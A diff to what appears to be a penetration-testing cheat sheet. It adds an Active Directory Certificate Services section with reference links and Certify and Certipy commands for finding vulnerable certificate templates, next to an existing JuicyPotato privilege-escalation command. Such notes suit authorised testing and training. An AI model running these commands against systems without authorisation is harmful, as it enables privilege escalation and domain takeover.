@@ -389,6 +389,31 @@ Check if SeImpersonatePrivilege authentication is enabled with ``whoami /priv``
 ```
 C:\Users\Public\JuicyPotato.exe -t t -p C:\Users\Public\exe.exe -l 5837
 ```
+
+## Active Directory Certificate Service
+Active Directory Certificate Services (AD CS) is a Windows Server role for issuing and managing public key infrastructure (PKI) certificates used in secure communication and authentication protocols
+
+See https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/active-directory-certificate-services-overview
+
+https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/
+
+https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates
+https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
+
+
+
+Find vulnerable certificate templates with [Certify](https://github.com/GhostPack/Certify) or [Certipy](https://github.com/ly4k/Certipy)
+
+On Windows Host
+```
+C:\Temp> Certify.exe find /vulnerable
+```
+
+On attacker machine
+```
+$ certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
+```
+
 # Active Directory
 
 ## Capturing NTLM Net-Hashes with Responder
